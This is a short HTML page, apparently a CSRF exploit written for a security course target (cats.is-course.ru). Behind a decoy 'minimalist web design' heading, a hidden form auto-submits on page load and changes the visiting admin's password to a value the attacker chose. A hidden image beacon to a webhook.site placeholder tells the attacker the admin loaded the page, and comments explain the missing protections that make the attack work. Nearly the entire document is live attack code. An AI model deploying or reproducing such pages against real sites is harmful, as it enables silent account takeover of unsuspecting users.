<h1>Award-winning minimalist web design</h1>
<p>Loading...</p>

<!-- CSRF: no CSRF token, no old-password check, SameSite=None cookie on cats.is-course.ru
     -> a simple cross-site form POST changes the victim's (admin's) password. -->
<form id="csrf-form" action="https://cats.is-course.ru/settings" method="POST" style="display:none">
    <input type="text" name="password" value="C4tsRuleForest!">
    <input type="text" name="confirm-password" value="C4tsRuleForest!">
</form>

<!-- Optional: beacon to confirm the admin actually loaded this page.
     Replace with your own https://webhook.site/<your-id> URL. -->
<img src="https://webhook.site/YOUR-UNIQUE-ID" style="display:none" alt="">

<script>
    document.getElementById('csrf-form').submit();
</script>
</body>
